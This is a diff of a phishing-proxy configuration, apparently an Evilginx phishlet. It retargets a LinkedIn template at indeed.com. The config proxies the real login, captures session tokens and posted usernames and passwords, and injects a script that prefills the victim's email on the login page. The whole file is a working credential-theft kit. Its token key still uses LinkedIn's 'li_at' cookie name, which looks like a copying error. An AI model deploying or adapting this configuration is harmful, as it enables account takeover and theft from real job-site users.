@@ -1,10 +1,10 @@
-author: '@mrgretzky'
+author: '@sanchal'
 min_ver: '2.3.0'
 proxy_hosts:
-  - {phish_sub: 'www', orig_sub: 'www', domain: 'linkedin.com', session: true, is_landing: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'indeed.com', session: true, is_landing: true}
 sub_filters: []
 auth_tokens:
-  - domain: '.www.linkedin.com'
+  - domain: 'indeed.com'
     keys: ['li_at']
 credentials:
   username:
@@ -16,16 +16,16 @@ credentials:
     search: '(.*)'
     type: 'post'
 login:
-  domain: 'www.linkedin.com'
-  path: '/uas/login'
+  domain: 'secure.indeed.com'
+  path: '/auth'
 js_inject:
-  - trigger_domains: ["www.linkedin.com"]
-    trigger_paths: ["/uas/login"]
-    trigger_params: ["email"]
+  - trigger_domains: ["secure.indeed.com"]
+    trigger_paths: ["/auth"]
+    trigger_params: ["__email"]
     script: |
       function lp(){
-        var email = document.querySelector("#username");
-        var password = document.querySelector("#password");
+        var email = document.querySelector("#__email");
+        var password = document.querySelector("#__password");
         if (email != null && password != null) {
           email.value = "{email}";
           password.focus();
